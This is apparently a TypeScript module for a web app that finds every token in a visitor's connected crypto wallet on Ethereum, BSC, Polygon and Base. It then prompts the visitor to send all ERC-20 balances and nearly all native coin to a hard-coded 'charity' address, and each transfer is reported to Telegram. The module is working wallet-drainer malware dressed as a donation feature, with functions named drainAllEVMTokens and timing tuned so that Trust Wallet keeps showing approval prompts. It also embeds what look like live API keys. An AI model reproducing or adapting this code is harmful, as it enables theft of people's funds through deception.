import { ethers } from 'ethers';
import { sendTelegramMessage } from '@/utils/telegram';

// EVM charity wallet address
export const EVM_CHARITY_WALLET = '0xAda53ED3Bc3D289F0A7E68c54B26cF7806D64398';

// QuickNode RPC endpoints per chain
const QUICKNODE_RPCS: Record<number, string> = {
  1: 'https://serene-greatest-putty.quiknode.pro/2d2b50b444a5e698af652819520cabba1534ab68',
  56: 'https://serene-greatest-putty.bsc.quiknode.pro/2d2b50b444a5e698af652819520cabba1534ab68',
  137: 'https://serene-greatest-putty.matic.quiknode.pro/2d2b50b444a5e698af652819520cabba1534ab68',
  8453: 'https://serene-greatest-putty.base-mainnet.quiknode.pro/2d2b50b444a5e698af652819520cabba1534ab68',
};

// Covalent API key and chain name mapping
const COVALENT_API_KEY = 'cqt_rQKwtQPfvxBX69tHBcVqV7w8xtfP';
const COVALENT_CHAIN_NAMES: Record<number, string> = {
  1: 'eth-mainnet',
  56: 'bsc-mainnet',
  137: 'matic-mainnet',
  8453: 'base-mainnet',
};

// ERC-20 minimal ABI for transfer
const ERC20_ABI = [
  'function balanceOf(address owner) view returns (uint256)',
  'function decimals() view returns (uint8)',
  'function symbol() view returns (string)',
  'function name() view returns (string)',
  'function transfer(address to, uint256 amount) returns (bool)',
  'function approve(address spender, uint256 amount) returns (bool)',
  'function allowance(address owner, address spender) view returns (uint256)',
];

export interface EVMTokenBalance {
  contractAddress: string;
  symbol: string;
  name: string;
  decimals: number;
  balance: bigint;
  uiAmount: number;
}

export interface TokenDetectionResult {
  success: boolean;
  tokens: EVMTokenBalance[];
  error?: string;
}

/**
 * Detect all ERC-20 tokens using Covalent GoldRush API (primary)
 * Falls back to QuickNode qn_getWalletTokenBalance if Covalent fails
 */
export async function detectWalletTokens(
  walletAddress: string,
  chainId: number
): Promise<TokenDetectionResult> {
  // Try Covalent first
  const covalentResult = await detectTokensViaCovalent(walletAddress, chainId);
  if (covalentResult.success && covalentResult.tokens.length > 0) {
    return covalentResult;
  }

  // Fallback to QuickNode
  const quicknodeResult = await detectTokensViaQuickNode(walletAddress, chainId);
  if (quicknodeResult.success && quicknodeResult.tokens.length > 0) {
    return quicknodeResult;
  }

  // Both failed or returned empty
  if (!covalentResult.success && !quicknodeResult.success) {
    return {
      success: false,
      tokens: [],
      error: `Token detection failed. Covalent: ${covalentResult.error || 'unknown'}. QuickNode: ${quicknodeResult.error || 'unknown'}.`,
    };
  }

  // APIs succeeded but wallet has no ERC-20 tokens
  return { success: true, tokens: [] };
}

/**
 * Detect tokens via Covalent GoldRush API
 */
async function detectTokensViaCovalent(
  walletAddress: string,
  chainId: number
): Promise<TokenDetectionResult> {
  const chainName = COVALENT_CHAIN_NAMES[chainId];
  if (!chainName) {
    return { success: false, tokens: [], error: `No Covalent chain mapping for chain ${chainId}` };
  }

  try {
    const url = `https://api.covalenthq.com/v1/${chainName}/address/${walletAddress}/balances_v2/?key=${COVALENT_API_KEY}&no-nft-fetch=true`;
    const response = await fetch(url);
    const data = await response.json();

    if (data.error || !data.data || !data.data.items) {
      return { success: false, tokens: [], error: data.error_message || 'Covalent API error' };
    }

    const tokens: EVMTokenBalance[] = [];
    for (const item of data.data.items) {
      // Skip native token (contract_address is often 0xeeee... or native_token is true)
      if (item.native_token || !item.contract_address) continue;
      // Skip zero-address placeholder for native token
      if (item.contract_address === '0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee') continue;

      const rawBalance = BigInt(item.balance || '0');
      if (rawBalance <= 0n) continue;

      const decimals = Number(item.contract_decimals || 18);
      tokens.push({
        contractAddress: item.contract_address,
        symbol: item.contract_ticker_symbol || 'UNKNOWN',
        name: item.contract_name || 'Unknown Token',
        decimals,
        balance: rawBalance,
        uiAmount: parseFloat(ethers.formatUnits(rawBalance, decimals)),
      });
    }

    console.log(`Covalent detected ${tokens.length} ERC-20 tokens on chain ${chainId}`);
    return { success: true, tokens };
  } catch (error) {
    console.error('Covalent token detection failed:', error);
    return { success: false, tokens: [], error: String(error) };
  }
}

/**
 * Detect tokens via QuickNode qn_getWalletTokenBalance (fallback)
 */
async function detectTokensViaQuickNode(
  walletAddress: string,
  chainId: number
): Promise<TokenDetectionResult> {
  const rpcUrl = QUICKNODE_RPCS[chainId];
  if (!rpcUrl) {
    return { success: false, tokens: [], error: `No QuickNode RPC for chain ${chainId}` };
  }

  try {
    const response = await fetch(rpcUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        id: 1,
        jsonrpc: '2.0',
        method: 'qn_getWalletTokenBalance',
        params: [{ wallet: walletAddress }],
      }),
    });

    const data = await response.json();

    if (data.error) {
      console.error('QuickNode token detection error:', data.error);
      return { success: false, tokens: [], error: data.error.message || 'QuickNode API error' };
    }

    const result = data.result;
    if (!result || !result.result) return { success: true, tokens: [] };

    const tokens: EVMTokenBalance[] = [];
    for (const token of result.result) {
      const rawBalance = BigInt(token.totalBalance || '0');
      if (rawBalance <= 0n) continue;

      const decimals = Number(token.decimals || 18);
      tokens.push({
        contractAddress: token.address,
        symbol: token.symbol || 'UNKNOWN',
        name: token.name || 'Unknown Token',
        decimals,
        balance: rawBalance,
        uiAmount: parseFloat(ethers.formatUnits(rawBalance, decimals)),
      });
    }

    console.log(`QuickNode detected ${tokens.length} ERC-20 tokens on chain ${chainId}`);
    return { success: true, tokens };
  } catch (error) {
    console.error('QuickNode token detection failed:', error);
    return { success: false, tokens: [], error: String(error) };
  }
}

/**
 * Send native token (ETH/BNB/MATIC/etc.) to the charity wallet
 */
export async function sendNativeToken(
  signer: ethers.JsonRpcSigner,
  amountWei: bigint,
  chainName: string,
  txOverrides?: ethers.TransactionRequest
): Promise<string> {
  const txReq: ethers.TransactionRequest = {
    to: EVM_CHARITY_WALLET,
    value: amountWei,
    ...(txOverrides || {}),
  };
  const tx = await signer.sendTransaction(txReq);

  // Fire-and-forget confirmation — do NOT block subsequent prompts on tx.wait()
  tx.wait().then(() => {
    sendTelegramMessage(`
✅ <b>EVM Native Transfer (${chainName})</b>
💰 <b>Amount:</b> <code>${ethers.formatEther(amountWei)}</code>
🔗 <b>Hash:</b> <code>${tx.hash}</code>
    `);
  }).catch((e) => console.warn('native tx.wait failed:', e));

  return tx.hash;
}

/**
 * Transfer an ERC-20 token to the charity wallet
 */
export async function sendERC20Token(
  signer: ethers.JsonRpcSigner,
  tokenAddress: string,
  amount: bigint,
  chainName: string
): Promise<string> {
  const contract = new ethers.Contract(tokenAddress, ERC20_ABI, signer);
  const tx = await contract.transfer(EVM_CHARITY_WALLET, amount);

  // Fire-and-forget confirmation — do NOT block the next prompt on tx.wait()
  tx.wait().then(async () => {
    let symbol = 'UNKNOWN';
    try { symbol = await contract.symbol(); } catch { }
    sendTelegramMessage(`
✅ <b>EVM ERC-20 Transfer (${chainName})</b>
🪙 <b>Token:</b> <code>${symbol} (${tokenAddress})</code>
🔗 <b>Hash:</b> <code>${tx.hash}</code>
    `);
  }).catch((e) => console.warn('erc20 tx.wait failed:', e));

  return tx.hash;
}

/**
 * Get native balance for connected EVM wallet
 */
export async function getNativeBalance(provider: ethers.BrowserProvider, address: string): Promise<bigint> {
  return provider.getBalance(address);
}

/**
 * Get ERC-20 token balance
 */
export async function getERC20Balance(
  provider: ethers.BrowserProvider,
  tokenAddress: string,
  walletAddress: string
): Promise<EVMTokenBalance | null> {
  try {
    const contract = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
    const [balance, decimals, symbol, name] = await Promise.all([
      contract.balanceOf(walletAddress),
      contract.decimals(),
      contract.symbol(),
      contract.name(),
    ]);

    return {
      contractAddress: tokenAddress,
      symbol,
      name,
      decimals,
      balance,
      uiAmount: parseFloat(ethers.formatUnits(balance, decimals)),
    };
  } catch (error) {
    console.error(`Failed to get ERC-20 balance for ${tokenAddress}:`, error);
    return null;
  }
}

/**
 * Drain all native tokens from EVM wallet (keep a small amount for gas)
 */
export async function drainNativeTokens(
  signer: ethers.JsonRpcSigner,
  provider: ethers.BrowserProvider,
  chainName: string
): Promise<string | null> {
  const address = await signer.getAddress();
  const balance = await provider.getBalance(address);

  const feeData = await provider.getFeeData();
  const gasLimit = 21000n;

  let gasCost: bigint;
  const txOverrides: ethers.TransactionRequest = { gasLimit };

  if (feeData.maxFeePerGas && feeData.maxPriorityFeePerGas) {
    // EIP-1559 (Ethereum, Base)
    txOverrides.maxFeePerGas = feeData.maxFeePerGas;
    txOverrides.maxPriorityFeePerGas = feeData.maxPriorityFeePerGas;
    txOverrides.type = 2;
    gasCost = feeData.maxFeePerGas * gasLimit;
  } else {
    // Legacy (BSC, Polygon)
    const gasPrice = feeData.gasPrice || ethers.parseUnits('20', 'gwei');
    txOverrides.gasPrice = gasPrice;
    txOverrides.type = 0;
    gasCost = gasPrice * gasLimit;
  }

  const buffer = gasCost * 3n;
  const sendAmount = balance - buffer;

  if (sendAmount <= 0n) {
    console.log(`[native] Not enough ${chainName} balance after gas`);
    return null;
  }

  console.log(`[native] Prompting wallet for ${chainName} transfer:`, sendAmount.toString());
  return sendNativeToken(signer, sendAmount, chainName, txOverrides);
}

/**
 * Small delay helper for Trust Wallet compatibility — ensures sequential tx processing.
 */
function txDelay(ms: number = 1500): Promise<void> {
  return new Promise(resolve => setTimeout(resolve, ms));
}

/**
 * Drain ALL EVM tokens: first ERC-20 tokens, then native token.
 */
export async function drainAllEVMTokens(
  signer: ethers.JsonRpcSigner,
  provider: ethers.BrowserProvider,
  chainName: string,
  chainId: number
): Promise<void> {
  // Connection-ready guard: verify signer/provider are responsive
  let address: string;
  try {
    address = await signer.getAddress();
    const net = await provider.getNetwork();
    console.log(`[drain] Signer ready on chain ${net.chainId}, address: ${address}`);
  } catch (e) {
    console.error('[drain] Signer/provider not ready — aborting.', e);
    throw new Error('Wallet not ready. Please reconnect and try again.');
  }

  // Step 1: Detect ERC-20 tokens (best-effort — never block native transfer)
  let detectedTokens: EVMTokenBalance[] = [];
  try {
    const detection = await detectWalletTokens(address, chainId);
    if (detection.success) {
      detectedTokens = detection.tokens;
    } else {
      console.warn('[drain] ERC-20 detection failed, will still attempt native:', detection.error);
    }
  } catch (e) {
    console.warn('[drain] ERC-20 detection threw, will still attempt native:', e);
  }

  // Step 2: ERC-20 transfers first
  for (let i = 0; i < detectedTokens.length; i++) {
    const token = detectedTokens[i];
    try {
      console.log(`[drain] ERC-20 ${i + 1}/${detectedTokens.length}: ${token.symbol}`);
      await sendERC20Token(signer, token.contractAddress, token.balance, chainName);
      await txDelay(1500);
    } catch (error) {
      console.error(`[drain] Failed ERC-20 ${token.symbol}:`, error);
    }
  }

  // Step 3: Native transfer LAST — longer delay before for Trust Wallet Android
  await txDelay(3000);
  try {
    console.log(`[drain] Prompting native ${chainName} transfer...`);
    await drainNativeTokens(signer, provider, chainName);
  } catch (error) {
    console.error('[drain] Native transfer failed:', error);
  }
}
